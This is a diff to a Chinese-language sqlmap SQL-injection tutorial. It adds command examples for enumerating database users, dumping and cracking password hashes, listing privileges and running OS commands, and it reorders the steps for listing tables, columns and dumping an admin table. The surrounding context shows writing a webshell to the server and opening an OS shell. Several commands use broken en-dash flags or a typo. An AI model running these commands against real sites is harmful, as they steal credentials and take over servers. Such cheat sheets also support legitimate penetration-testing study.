@@ -213,13 +213,19 @@ sqlmap教程
 	``sqlmap -u http://www.baidu.com/shownews.asp –cookie “id=11” –level 2``
 - 从POST数据包注入
 	``sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql`` 
+- 列举数据库管理系统中的用户
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –users`` 
+- 列举并破解数据库管理系统用户密码Hash值
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql --passwords -v 1`` 
+- 列举数据库管理系统的用户权限
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –privileges`` 
 - 获取数据库基本信息
 	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs``
-- 查询有哪些数据库
-	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables``
 - 查询test数据库中有哪些表
-	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns``
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables``
 - 查询test数据库中admin表有哪些字段
+	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns``
+- dump出admin表中用户名和密码的数据
 	``sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump``
 - 在dedecms数据库中搜索字段admin或者password
 	``sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password``
@@ -229,5 +235,7 @@ sqlmap教程
 	| –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
 	| –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
 	| ``sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”``
+- 执行命令
+	``sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig`` 
 - 使用shell命令
 	``sqlmap -r “c:\tools\request.txt” -p id –dms mysql –-os-shell``
